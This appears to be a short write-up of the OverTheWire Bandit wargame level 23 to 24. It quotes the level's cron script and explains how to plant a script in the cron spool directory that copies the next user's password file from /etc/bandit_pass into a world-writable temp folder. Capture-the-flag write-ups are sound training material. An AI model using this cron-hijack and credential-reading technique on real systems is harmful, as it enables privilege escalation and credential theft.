23 -> 24

This is the script that is calling the cronjob

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done


As we see, as long as we create a script in /var/spool/bandit24/foo that saves the password of/etc/bandit_pass/bandit24 somewhere.
So, first of all we create a temporal persistent directory (as the instructions of over_the_wire says)

mktemp -d

We are the creators of that dir so we can give everyone permissions to write and read to that dir with

chmod 777 /tmp/<tmp>.<id>

then we write a bash script and give it permissions for executions for everyone then we copy it on /var/spool/bandit24/foo

This is the script:
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.e3rlEMQEda/password

The cronjob is executed every minute so we wait a little bit and then we obtain the password in that "password" file is important to say that we have to give everyone permissions to write in that file.

Finally we obtain the password.
